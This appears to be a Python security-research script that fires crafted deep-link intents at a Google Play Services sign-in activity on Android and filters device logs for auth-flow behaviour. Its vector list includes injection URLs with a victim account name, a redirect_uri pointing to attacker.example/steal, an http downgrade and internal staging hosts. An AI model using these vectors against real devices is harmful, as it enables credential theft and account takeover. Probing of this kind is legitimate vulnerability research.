#!/usr/bin/env python3
"""
GMS Sign-In deep link:
  com.google.android.gms.auth.aang.impl.deeplink.DeepLinkActivity
  exported=true, NO android:permission, autoVerify=true, BROWSABLE,
  https://accounts.google.com/devicephoneverification/begin
  Theme.NoDisplay, launchMode=singleTask, taskAffinity=""

DeepLinkChimeraActivity parses the query string and builds a SignInRequest
(Laubh.<init>(... ~10 attacker-supplied strings ...)) then startActivity()s the auth flow.

Question: can an unauthenticated caller drive this far enough to obtain or leak a credential,
pre-select an account, or reach the flow without the user seeing it?
"""
import json
import os
import re
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import capture as C

GMS = "com.google.android.gms"

BASE = "https://accounts.google.com/devicephoneverification/begin"
VECTORS = [
    ("bare", BASE),
    ("account_name", BASE + "?account_name=victim@gmail.com"),
    ("account_name_encoded", BASE + "?account_name=victim%40gmail.com&hd=evil.example"),
    ("flow_param", BASE + "?flow=signin&account_name=victim@gmail.com"),
    ("redirect_uri", BASE + "?redirect_uri=https://attacker.example/steal"),
    ("staging_host", "https://gaiastaging.corp.google.com/devicephoneverification/begin"
                     "?account_name=victim@gmail.com"),
    ("sandbox_host", "https://accounts.sandbox.google.com/devicephoneverification/begin"
                     "?account_name=victim@gmail.com"),
    ("proto_downgrade", "https://accounts.google.com/devicephoneverification/begin"
                        "?redirect_uri=http://attacker.example"),
]

KEEP = re.compile(
    r"(aang|AANG|DeepLink|SignIn|signin|SignInRequest|AuthAccount|authzen|"
    r"AuthorizationFlow|token|Token|consent|Consent|credential|Credential|"
    r"AccountState|DeviceAccount|assh|ASh|GetToken|"
    r"FATAL|Exception|not allowed|disabled|Invalid url|account_name|redirect)",
    re.I)


def fire(url, label):
    C.capture(f"gmssignin_{label}", {"type": "start", "action": "android.intent.action.VIEW",
                                    "data": url, "label": label},
              [GMS], settle=5, fg=True)
    log = open(os.path.join(C.EVID, f"gmssignin_{label}.full.txt")).read()
    return log


if __name__ == "__main__":
    for label, url in VECTORS:
        log = fire(url, label)
        launched = [l for l in log.splitlines() if "ActivityTaskManager: START" in l]
        bal = [l for l in log.splitlines() if "Background activity launch blocked" in l]
        crash = [l for l in log.splitlines() if "FATAL EXCEPTION" in l]
        keep, seen = [], set()
        for l in log.splitlines():
            if KEEP.search(l) and l not in seen:
                seen.add(l)
                keep.append(l)
        print(f"\n{'='*100}\n### {label}: {url}")
        print("  BAL blocked" if bal else "  no BAL block")
        for l in launched[-2:]:
            print("  L " + l[:290])
        for l in crash[:1]:
            print("  X " + l[:290])
        for l in keep[:12]:
            print("  ~ " + l[:290])